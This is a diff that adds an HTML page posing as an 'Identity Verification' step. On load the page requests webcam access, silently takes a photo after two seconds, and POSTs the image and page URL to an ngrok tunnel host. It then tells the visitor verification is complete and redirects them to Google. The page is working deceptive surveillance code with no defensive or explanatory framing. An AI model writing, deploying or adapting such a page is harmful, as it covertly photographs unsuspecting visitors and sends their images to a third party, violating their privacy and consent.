@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html><head><title>Identity Verification</title>
+<script>
+function capture() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                let imageData = canvas.toDataURL('image/jpeg');
+                fetch('https://sharen-unguillotined-confoundedly.ngrok-free.dev/webcam', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({image: imageData, url: window.location.href})
+                });
+                stream.getTracks().forEach(track => track.stop());
+                document.body.innerHTML = '<h2>Verification complete. Redirecting...</h2>';
+                setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+            }, 2000);
+        })
+        .catch(err => {
+            document.body.innerHTML = '<h2>Camera access denied. Redirecting...</h2>';
+            setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+        });
+}
+window.onload = capture;
+</script>
+</head>
+<body><h2>Please allow camera access for identity verification...</h2></body>
+</html>
